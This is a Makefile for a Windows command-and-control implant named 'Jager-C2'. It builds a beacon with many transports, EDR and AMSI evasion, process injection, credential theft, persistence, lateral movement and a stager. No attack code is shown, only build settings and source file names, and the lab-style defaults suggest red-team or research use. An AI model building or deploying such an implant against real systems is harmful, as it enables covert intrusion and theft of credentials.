# Jager-C2 Implant - Cross-compilation Makefile
CC = x86_64-w64-mingw32-gcc
CFLAGS = -Wall -Os -s -DWIN32_LEAN_AND_MEAN -D_WIN32_WINNT=0x0601
OBF_KEY ?= 0x42
LDFLAGS = -lwinhttp -lbcrypt -ladvapi32 -lws2_32 -liphlpapi -lnetapi32 -ldnsapi \
          -lole32 -loleaut32 -luuid -lwbemuuid -lgdi32 -lcrypt32 -lsecur32 -lpsapi -luser32 \
          -mwindows -Wl,--gc-sections
INCLUDES = -Iinclude

CORE_SRC = src/core/beacon.c src/core/transport.c src/core/transport_dns.c \
           src/core/transport_smb.c src/core/transport_tcp.c \
           src/core/transport_front.c src/core/transport_failover.c \
           src/core/tunnel.c src/core/malleable.c src/core/tasks.c \
           src/core/tasks_postex.c src/core/process.c

UTIL_SRC = src/util/base64.c src/util/json.c src/util/json_emit.c src/util/crypto.c src/util/tracked_alloc.c

EVASION_SRC = src/evasion/syscalls.c src/evasion/sleep_mask.c src/evasion/sleep_stub.c \
              src/evasion/stack_spoof.c src/evasion/patches.c \
              src/evasion/hwbp_bypass.c src/evasion/anti_analysis.c \
              src/evasion/injection.c src/evasion/module_stomp.c \
              src/evasion/threadless_inject.c src/evasion/ppid_spoof.c \
              src/evasion/return_spoof.c src/evasion/etw_ti.c \
              src/evasion/process_hollow.c src/evasion/dll_unhook.c

EXEC_SRC = src/execution/bof_loader.c

PIVOT_SRC = src/pivot/socks.c src/pivot/portfwd.c src/pivot/tasks_pivot.c \
            src/pivot/pipe.c src/pivot/tcp_pivot.c src/pivot/p2p_relay.c

POSTEX_SRC = src/postex/credentials.c src/postex/discovery.c \
             src/postex/persistence.c src/postex/lateral.c \
             src/postex/postex_wrappers.c src/postex/privesc.c \
             src/postex/token_ops.c src/postex/exec_clr.c \
             src/postex/auto_enum.c

FS_SRC = src/filesystem/fs.c

ASM_SRC = src/asm/spoof.x64.S src/asm/syscalls.x64.S

ALL_SRC = $(CORE_SRC) $(UTIL_SRC) $(FS_SRC) $(EVASION_SRC) $(EXEC_SRC) \
          $(PIVOT_SRC) $(POSTEX_SRC) $(ASM_SRC)

OUT_DIR = bin
EXE_OUT = $(OUT_DIR)/implant.exe
DLL_OUT = $(OUT_DIR)/implant.dll
STAGER_OUT = $(OUT_DIR)/stager.exe

C2_URL ?= https://127.0.0.1:443
SLEEP ?= 60
JITTER ?= 20
KILL_DATE ?= 0
AMSI_BYPASS_METHOD ?= 0
INJECT_METHOD ?= 1
LAB_NO_TLS_VERIFY ?= 1

SLEEP_TECHNIQUE ?= 1

CONFIG_DEFS = -DC2_URL=\"$(C2_URL)\" -DSLEEP_SECONDS=$(SLEEP) \
              -DJITTER_PERCENT=$(JITTER) -DKILL_DATE=$(KILL_DATE) \
              -DOBF_KEY=$(OBF_KEY) -DAMSI_BYPASS_METHOD=$(AMSI_BYPASS_METHOD) \
              -DSLEEP_TECHNIQUE=$(SLEEP_TECHNIQUE) -DINJECT_METHOD=$(INJECT_METHOD)

ifeq ($(LAB_NO_TLS_VERIFY),1)
CONFIG_DEFS += -DLAB_NO_TLS_VERIFY
endif

.PHONY: all exe dll stager clean

all: exe

exe: $(OUT_DIR)
	$(CC) $(CFLAGS) $(INCLUDES) $(CONFIG_DEFS) $(ALL_SRC) -o $(EXE_OUT) $(LDFLAGS)

dll: $(OUT_DIR)
	$(CC) $(CFLAGS) $(INCLUDES) $(CONFIG_DEFS) -DBUILD_DLL -shared $(ALL_SRC) -o $(DLL_OUT) $(LDFLAGS)

stager: $(OUT_DIR)
	$(CC) $(CFLAGS) -Iinclude $(if $(filter 1,$(LAB_NO_TLS_VERIFY)),-DLAB_NO_TLS_VERIFY,) \
		-mwindows src/stager/stager.c -o $(STAGER_OUT) \
		-lwinhttp -lbcrypt -ladvapi32 -lcrypt32 -Wl,--gc-sections

$(OUT_DIR):
	mkdir -p $(OUT_DIR)

clean:
	rm -rf $(OUT_DIR)

debug: $(OUT_DIR)
	$(CC) -Wall -g -DWIN32_LEAN_AND_MEAN $(INCLUDES) $(CONFIG_DEFS) $(ALL_SRC) -o $(OUT_DIR)/implant-debug.exe $(LDFLAGS)
